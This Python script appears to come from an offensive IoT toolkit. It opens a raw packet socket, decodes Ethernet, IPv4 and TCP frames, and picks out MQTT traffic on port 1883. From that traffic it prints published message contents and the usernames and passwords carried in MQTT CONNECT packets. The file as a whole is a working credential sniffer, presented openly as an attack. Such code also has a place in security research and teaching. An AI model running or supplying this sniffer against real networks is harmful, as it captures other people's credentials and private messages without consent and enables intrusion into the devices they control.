import socket
import textwrap

from attacks.sniffing.networking.ethernet import Ethernet
from attacks.sniffing.networking.ipv4 import IPv4
from attacks.sniffing.networking.mqtt import MQTT
from attacks.sniffing.networking.tcp import TCP

TAB_1 = '\t - '
TAB_2 = '\t\t - '
TAB_3 = '\t\t\t - '
TAB_4 = '\t\t\t\t - '

DATA_TAB_1 = '\t '
DATA_TAB_2 = '\t\t '
DATA_TAB_3 = '\t\t\t '
DATA_TAB_4 = '\t\t\t\t '


def main():
    conn = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))

    while True:
        raw_data, addr = conn.recvfrom(655536)
        eth_frame = Ethernet(raw_data)

        # 8 for IPv4
        if eth_frame.proto == 8:
            ipv4_packet = IPv4(eth_frame.data)

            # Protocol code 6 is TCP
            if ipv4_packet.proto == 6:
                tcp_segment = TCP(ipv4_packet.data)

                # Port 1883 is MQTT
                if len(tcp_segment.data) > 0 and (tcp_segment.src_port == 1883 or tcp_segment.dest_port == 1883):
                    mqtt_data = MQTT(tcp_segment.data)
                    if mqtt_data.message_type == MQTT.PUBLISH:
                        print("Source IP address: {}, destination IP address: {}"
                              .format(ipv4_packet.src, ipv4_packet.target))
                        print("Captured an MQTT publish message: \n" + mqtt_data.message)
                    elif mqtt_data.message_type == MQTT.CONNECT:
                        if mqtt_data.username and mqtt_data.password:
                            print("Source IP address: {}, destination IP address: {}"
                                  .format(ipv4_packet.src, ipv4_packet.target), end='')
                            print("Captured username/password in an MQTT connect message.")
                            print("username: {} password: {}".format(mqtt_data.username, mqtt_data.password))
                    else:
                        print("Captured an MQTT message with no content of interest.")
                    print()


def format_multi_line(prefix, string, size=80):
    size -= len(prefix)
    if isinstance(string, bytes):
        string = ''.join(r'\x{:02x}'.format(byte) for byte in string)
        if size % 2:
            size -= 1
    return '\n'.join([prefix + line for line in textwrap.wrap(string, size)])


if __name__ == '__main__':
    main()
